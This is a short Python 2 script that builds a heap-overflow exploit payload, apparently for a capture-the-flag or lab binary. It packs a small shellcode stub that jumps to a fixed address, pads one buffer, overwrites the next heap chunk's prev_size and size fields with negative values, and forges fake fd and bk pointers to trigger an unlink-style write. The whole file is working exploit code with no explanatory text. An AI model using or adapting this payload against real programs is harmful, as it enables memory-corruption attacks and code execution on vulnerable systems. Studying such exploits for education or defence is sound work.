shellcode = "\x68\x64\x88\x04\x08\xc3" 
# push 0x08048864
# ret

a = "A" * 4
a += shellcode
a += "A" * 22

# overflow into b
a += "\xf8\xff\xff\xff" # prev_size
a += "\xfc\xff\xff\xff" # size

b = "A" * 8
b += "\x1c\xb1\x04\x08" # fake_chunk->fd
b += "\x0c\xc0\x04\x08" # fake_chunk->bk

c = "CCCC"

print a + " " + b + " " + c